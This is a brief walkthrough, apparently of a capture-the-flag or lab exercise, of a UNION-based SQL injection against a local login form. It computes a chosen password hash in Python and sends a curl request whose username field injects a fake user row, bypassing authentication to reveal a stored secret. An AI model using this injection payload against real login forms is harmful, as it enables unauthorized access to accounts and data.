We are going to use SQL Injection using a UNION statement to get the data.

First off, we look at the code and generate a password_hash value for a password of 'foo' and a salt of 'aaaaaa'

```
$ python
>>> import hashlib
>>> hashlib.sha256("foo" + "aaaaaa").hexdigest()
'1822b05ea84c8defe17bd6c29a4ec5c8f8a017ed2c0b558a8f3327c33c116229'
```

Next we make curl requests to get a logged-in user with the secret revealed.

```
curl -L http://127.0.0.1:5000/login --data "username=' UNION SELECT 1, '1822b05ea84c8defe17bd6c29a4ec5c8f8a017ed2c0b558a8f3327c33c116229', 'aaaaaa' ORDER BY salt LIMIT 1;--&password=foo" -b cookies
```

Change the ID as necessary to get the password, rather than the secret plans or proof.